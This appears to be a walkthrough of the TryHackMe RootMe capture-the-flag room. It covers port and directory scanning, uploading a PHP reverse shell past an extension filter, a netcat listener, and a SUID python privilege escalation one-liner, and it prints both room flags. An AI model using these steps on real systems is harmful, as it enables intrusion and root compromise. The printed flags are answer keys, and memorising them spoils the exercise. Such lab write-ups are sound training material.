<h1 align="center">:fire: TryHackMe Rootme room :fire: </h1>

![preview](images/00-preview.png)<br/>

TryHackMe [Room link](https://tryhackme.com/room/rrootme)<br/>


## Task 2 Reconnaissance 
### Q: Scan the machine, how many ports are open?

    nmap -sV -sC -F 10.10.242.162

![download](images/02-scan-ip.png)<br/>

#### A: `2`

### Q: What version of Apache is running?

## See Task 2 first image.

#### A: `2.4.29`

### Q: What service is running on port 22?

## See Task 2 first image.

#### A: `ssh`

### Q: What is the hidden directory?

    sudo dirsearch --full-url -u http://10.10.242.162/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

![download](images/03-found-hidden-dir.png)<br/>

#### A: `/panel/`


## Task 3 Getting a shell 
### Q: user.txt

    ip a

![download](images/04-grep-tun0-ip.png)<br/>

Php [Reverse Shell Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)<br/>

![download](images/05-modify-ip-port.png)<br/>

![download](images/06-up-shell.png)<br/>

![download](images/07-intercept-request.png)<br/>

![download](images/08-add-to-sniper.png)<br/>

Most Common [Extension List](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/extensions-most-common.fuzz.txt)<br/>

![download](images/09-load-common-extention.png)<br/>

![download](images/10-extension-detected.png)<br/>

![download](images/11-file-uploaded.png)<br/>

    nc -lvnp 1234

![download](images/12-get-reverse-connections.png)<br/>

    cd var/www/
    cat user.txt
 
![download](images/13-user-flag-found.png)<br/>

#### A: `THM{y0u_g0t_a_sh3ll}`

## Task 4 Privilege escalation 
### Q: Search for files with SUID permission, which file is weird?

    python -c 'import pty; pty.spawn("/bin/bash")'

![download](images/14-convert-to-bash-terminal.png)<br/>

    find / -perm -u=s -type f 2>/dev/null

![download](images/16-vulnerable-target-found.png)<br/>

#### A: `/usr/bin/python`

[GTFOBins](https://gtfobins.github.io)<br/>

### Q: root.txt

    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

![download](images/17-switch-bash-terminal-and-prevescallation.png)<br/>

    cd root
    cat root.txt

![download](images/18-root-flag-founded.png)<br/>

#### A: `THM{pr1v1l3g3_3sc4l4t10n}`

<h1 align="center">:fire: Finished :fire: </h1>
